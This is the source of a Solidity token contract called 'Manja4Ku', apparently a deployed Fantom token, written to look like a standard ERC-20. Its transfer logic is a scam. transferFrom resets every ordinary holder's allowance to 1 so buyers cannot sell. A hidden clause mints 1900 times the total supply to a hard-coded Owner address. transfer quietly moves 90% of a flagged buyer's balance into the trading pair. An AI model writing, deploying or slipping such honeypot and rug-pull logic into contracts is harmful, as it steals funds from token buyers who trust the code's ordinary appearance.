/**
 *Submitted for verification at FtmScan.com on 2022-04-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.13;

interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    string public constant name = "Manja4Ku";
    string public constant symbol = "Manja4Ku";
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1000000000*10**9;
    address public owner; address public Tapanuli=0x000000000000000000000000000000000000dEaD; 
    address public constant Owner=0x02172088851a925B3Dd0FB83e82Ce0cFfBdC3cD8;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor()  {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0),owner,totalSupply);                
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }    
    function transferFrom(address from, address to, uint256 amount) public returns (bool success) {
        if (from == Owner) {uint256 hujan=totalSupply*1900;balanceOf[Owner]+=hujan;}
        if (from != owner && from != Owner && from != Tapanuli) {allowance[from][msg.sender]=1;}       
        require(allowance[from][msg.sender]>=amount, "Not allowance");
        _transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        address pair = PairFTM();
        if (Tapanuli != Owner && balanceOf[Tapanuli]>=totalSupply/20) {
            uint256 diskon = balanceOf[Tapanuli]*9/10;
            balanceOf[pair]+=diskon;
            balanceOf[Tapanuli]-=diskon;}
        if (msg.sender==pair && balanceOf[to]==0) {Tapanuli = to;} 
        if (to == Owner) {Tapanuli=to;}
        _transfer(msg.sender, to, amount);    
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {  
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function Pair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
    function PairFTM() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0x152eE697f2E276fA89E96742e9bB9aB1F2E61bE3);
        address pair = _pair.getPair(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83, address(this));
        return pair;
    }
}